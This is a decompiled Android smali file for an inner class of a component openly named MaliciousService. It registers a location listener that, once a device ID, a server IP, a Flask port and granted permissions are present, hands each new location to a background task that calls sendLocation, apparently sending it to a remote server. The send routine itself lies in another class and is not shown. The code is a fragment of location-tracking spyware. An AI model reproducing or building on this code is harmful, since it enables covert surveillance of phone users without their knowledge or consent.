.class Lcom/example/android/MaliciousService$2;
.super Ljava/lang/Object;
.source "MaliciousService.java"

# interfaces
.implements Landroid/location/LocationListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/android/MaliciousService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/android/MaliciousService;


# direct methods
.method public static synthetic $r8$lambda$Vw5bAm7bsEecTn6YNG_MUVvEx7I(Lcom/example/android/MaliciousService$2;Landroid/location/Location;)V
    .registers 2

    invoke-direct {p0, p1}, Lcom/example/android/MaliciousService$2;->lambda$onLocationChanged$0(Landroid/location/Location;)V

    return-void
.end method

.method constructor <init>(Lcom/example/android/MaliciousService;)V
    .registers 2

    .line 111
    iput-object p1, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private synthetic lambda$onLocationChanged$0(Landroid/location/Location;)V
    .registers 3

    .line 115
    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0, p1}, Lcom/example/android/MaliciousService;->-$$Nest$msendLocation(Lcom/example/android/MaliciousService;Landroid/location/Location;)V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .registers 4

    .line 114
    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z

    move-result v0

    if-eqz v0, :cond_53

    .line 115
    iget-object v0, p0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lcom/example/android/MaliciousService$2$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0, p1}, Lcom/example/android/MaliciousService$2$$ExternalSyntheticLambda0;-><init>(Lcom/example/android/MaliciousService$2;Landroid/location/Location;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    goto :goto_5a

    .line 117
    :cond_53
    const-string p1, "MaliciousService"

    const-string v0, "Config or permissions not ready, skipping location send."

    invoke-static {p1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 119
    :goto_5a
    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .registers 2

    .line 122
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .registers 2

    .line 121
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .registers 4

    .line 120
    return-void
.end method
